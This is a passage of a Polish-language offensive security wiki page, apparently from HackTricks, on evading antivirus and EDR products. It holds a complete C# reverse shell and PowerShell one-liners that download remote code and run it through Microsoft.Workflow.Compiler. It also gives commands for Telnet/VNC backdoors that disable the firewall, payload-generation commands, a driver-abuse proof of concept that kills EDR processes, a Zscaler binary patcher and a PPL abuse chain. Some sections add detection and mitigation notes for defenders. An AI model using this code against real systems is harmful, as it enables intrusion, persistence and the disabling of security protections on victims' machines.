Ładowanie binarek C# do pamięci jest znane od dawna i wciąż jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, jedyną rzeczą, o którą musimy się martwić, jest załatane AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już oferuje możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, by to zrobić:

- **Fork\&Run**

Polega na **utworzeniu nowego procesu ofiary**, wstrzyknięciu do niego twojego kodu post-exploitation, uruchomieniu go, a po wykonaniu zabiciu tego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** naszym procesem Beacon implant. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przeżyje.** Wadą jest **większe prawdopodobieństwo** wykrycia przez wykrycia behawioralne.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i poddawania go skanowaniu przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **znacznie większa szansa** na **utracenie beacona**, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **from PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Dając dostęp do interpreter binaries i środowiska na udziale SMB możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd. mamy **więcej elastyczności, by obejść statyczne sygnatury**. Testy z losowymi nieobfuskowanymi reverse shell skryptami w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access tokenem lub produktem bezpieczeństwa takim jak EDR czy AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zostanie zabity, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na maszynie ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz z https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator w trybie cichym na ofierze (wymagane uprawnienia administracyjne): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga na parametr pin, który pozwala ustawić pin bez używania GUI).

## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasem trzeba brać pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części binarki** aż **zidentyfikuje, którą część Defender** uznaje za złośliwą i rozdzieli ją dla ciebie.\
Inne narzędzie robiące **to samo** to [**avred**](https://github.com/dobin/avred) z otwartą usługą webową pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 włącznie, wszystkie Windowsy miały **Telnet server**, który można było zainstalować (jako administrator) robiąc:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby się **uruchamiał** przy starcie systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebujesz binarnych wersji, nie instalatora)

**NA MASZYNIE OFIARY**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **ofiary**

#### **Połączenie odwrotne**

**Atakujący** powinien **uruchomić na** swoim **hoście** binarkę `vncviewer.exe -listen 5900`, aby była **przygotowana** do przyjęcia odwrotnego **połączenia VNC**. Następnie, na **maszynie ofiary**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję nie wolno robić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` żeby uzyskać pomoc, bo spowoduje to wyświetlenie [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **start the lister** przy użyciu `msfconsole -r file.rc` i **wykonaj** **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilacja naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# — użycie kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z poziomu jądra

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpointów przed zrzuceniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nawet Protected-Process-Light (PPL) usługi AV nie mogą zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany sterownik `AToolsKrnl64.sys` z narzędzi Antiy Labs „System In-Depth Analysis Toolkit”. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga ją uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z poziomu trybu użytkownika.
3. **IOCTL-y udostępnione przez sterownik**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończ dowolny proces po PID (używane do zabicia usług Defender/EDR) |
| `0x990000D0` | Usuń dowolny plik na dysku |
| `0x990001D0` | Wyładuj sterownik i usuń usługę |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD całkowicie pomija ochrony w trybie użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych funkcji zabezpieczających.

Wykrywanie / łagodzenie
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *usług jądra* i generuj alert, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na liście dozwolonych.  
•  Monitoruj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Ominięcie kontroli postawy Zscaler Client Connector poprzez łatkowanie binarek na dysku

Zscaler’s **Client Connector** stosuje zasady postawy urządzenia lokalnie i polega na Windows RPC do przekazywania wyników innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłana jest wartość logiczna).  
2. Wewnętrzne endpointy RPC sprawdzają tylko, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (przy użyciu `WinVerifyTrust`).

Poprzez załatanie czterech podpisanych binarek na dysku obydwa mechanizmy można zneutralizować:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każde sprawdzenie jest zgodne |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet niepodpisany) proces może podpiąć się do pipe'ów RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpiona przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Pominięte |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole postawy pokazują **zielone/zgodne**.
* Niesygnowane lub zmodyfikowane binaria mogą otworzyć named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zainfekowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej politykami Zscaler.

To studium przypadku demonstruje, jak decyzje oparte wyłącznie na zaufaniu po stronie klienta i proste kontrole podpisu można obejść kilkoma poprawkami bajtów.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisów i poziomów tak, że tylko procesy chronione o równym lub wyższym poziomie mogą nawzajem w nich ingerować. W ataku, jeśli możesz legalnie uruchomić binarkę z włączonym PPL i kontrolować jej argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logowanie) w ograniczony, wsparty przez PPL prymityw zapisu skierowany przeciwko chronionym katalogom używanym przez AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Pomocnik open-source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia się sam i akceptuje parametr do zapisania pliku dziennika w ścieżce określonej przez wywołującego.
- Po uruchomieniu jako proces PPL, zapis pliku odbywa się z ochroną PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać na normalnie chronione lokalizacje.

8.3 short path helpers
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyprowadź krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` korzystając z launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3, jeśli to konieczne.
3) Jeśli docelowy plik binarny jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu przed uruchomieniem AV przez zainstalowanie usługi auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis z ochroną PPL następuje zanim AV zablokuje swoje pliki binarne, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie można kontrolować zawartości, które zapisuje ClipUp poza miejscem umieszczenia; prymityw nadaje się do korumpowania danych, a nie do precyzyjnego wstrzykiwania zawartości.
- Wymaga uprawnień lokalnego admina/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na restart.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie przy starcie systemu unika blokad plików.

Wykrywanie
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy rodzicem są niestandardowe launchery, w czasie uruchamiania systemu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów startu Defendera.
- Monitorowanie integralności plików dla binarek Defender/Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez nie‑AV binarki.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi procesami rodzicami; zablokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością startu.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (przetestuj dokładnie).

Odniesienia dotyczące PPL i narzędzi
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
